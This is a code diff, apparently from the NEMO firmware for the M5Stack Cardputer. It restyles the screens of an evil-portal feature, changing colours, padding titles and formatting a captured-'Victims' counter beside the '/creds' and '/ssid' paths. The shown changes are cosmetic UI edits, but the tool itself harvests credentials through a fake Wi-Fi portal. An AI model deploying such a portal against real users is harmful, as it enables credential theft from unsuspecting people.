@@ -59,12 +59,12 @@ void setSSID(String ssid){
 
 #ifdef CARDPUTER
 void confirmOrTypeSSID(){
-  DISP.fillScreen(BLACK);
+  DISP.fillScreen(BGCOLOR);
   DISP.setSwapBytes(true);
   DISP.setTextSize(MEDIUM_TEXT);
-  DISP.setTextColor(TFT_RED, BGCOLOR);
+  DISP.setTextColor(BGCOLOR, FGCOLOR);
   DISP.setCursor(0, 0);
-  DISP.println("WiFi SSID");
+  DISP.println("  WiFi SSID  ");
   DISP.setTextSize(TINY_TEXT);
   DISP.setTextColor(FGCOLOR, BGCOLOR);
   DISP.println(TYPE_SSID_TEXT);
@@ -139,12 +139,12 @@ void getSSID(){
 }
 
 void printHomeToScreen() {
-  DISP.fillScreen(BLACK);
+  DISP.fillScreen(BGCOLOR);
   DISP.setSwapBytes(true);
   DISP.setTextSize(MEDIUM_TEXT);
-  DISP.setTextColor(TFT_RED, BGCOLOR);
+  DISP.setTextColor(BGCOLOR, FGCOLOR);
   DISP.setCursor(0, 0);
-  DISP.println("NEMO PORTAL");
+  DISP.println(" NEMO PORTAL ");
   DISP.setTextSize(SMALL_TEXT);
   DISP.setTextColor(FGCOLOR, BGCOLOR);
   DISP.printf("%s\n\n",apSsidName.c_str());
@@ -152,8 +152,8 @@ void printHomeToScreen() {
   DISP.println(AP_GATEWAY);
   DISP.println("Paths: /creds /ssid");
   DISP.setTextSize(MEDIUM_TEXT);
-  DISP.setTextColor(TFT_RED, BGCOLOR);
-  DISP.printf("Victims: %d\n", totalCapturedCredentials);
+  DISP.setTextColor(BGCOLOR, FGCOLOR);
+  DISP.printf("Victims: %-4d\n", totalCapturedCredentials);
   DISP.setTextColor(FGCOLOR, BGCOLOR);
 }
 
